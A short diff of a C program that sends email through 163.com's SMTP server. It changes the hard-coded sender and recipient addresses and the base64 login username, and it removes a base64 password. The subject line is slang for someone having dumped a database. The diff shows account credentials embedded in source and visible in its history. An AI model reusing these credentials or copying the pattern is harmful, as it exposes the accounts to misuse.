@@ -16,8 +16,8 @@ struct hostent *hp, *gethostbyname();
 char buf[BUFSIZ+1];
 int len;
 char *host_id="smtp.163.com";
-char *from_id="kbzs@163.com";
-char *to_id="9121063@qq.com";
+char *from_id="kbztls@163.com";
+char *to_id="912106283@qq.com";
 char *sub="有人脱裤了lol\r\n";
 char wkstr[100]="hello how r u\r\n";
 
@@ -63,10 +63,10 @@ int main(int argc, char* argv[])
 	send_socket("AUTH LOGIN");
 	send_socket("\r\n");
 	read_socket();
-	send_socket("aGxzQDE2My5jb20=");
+	send_socket("a2J6dGxzQDE2My5jb20=");
 	send_socket("\r\n");
 	read_socket();
-	send_socket("baTE2Mw==");
+	send_socket("");
 	send_socket("\r\n");
 	read_socket();
 
